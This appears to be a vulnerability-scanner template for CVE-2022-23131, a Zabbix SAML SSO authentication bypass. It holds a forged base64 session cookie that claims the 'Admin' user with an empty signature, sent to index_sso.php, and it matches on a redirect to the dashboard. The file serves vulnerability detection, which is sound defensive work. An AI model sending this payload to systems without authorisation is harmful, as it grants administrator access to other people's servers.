id: CVE-2022-23131

info:
  name: Zabbix - SAML SSO Authentication Bypass
  author: For3stCo1d
  severity: critical
  description: When SAML SSO authentication is enabled (non-default), session data can be modified by a malicious actor because a user login stored in the session was not verified.
  tags: zabbix

requests:
  - method: GET
    path:
      - "{{BaseURL}}/zabbix/index_sso.php"
      - "{{BaseURL}}/index_sso.php"

    headers:
      Cookie: "zbx_session=eyJzYW1sX2RhdGEiOnsidXNlcm5hbWVfYXR0cmlidXRlIjoiQWRtaW4ifSwic2Vzc2lvbmlkIjoiIiwic2lnbiI6IiJ9"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 302

      - type: word
        part: header
        word:
          - zabbix.php?action=dashboard.view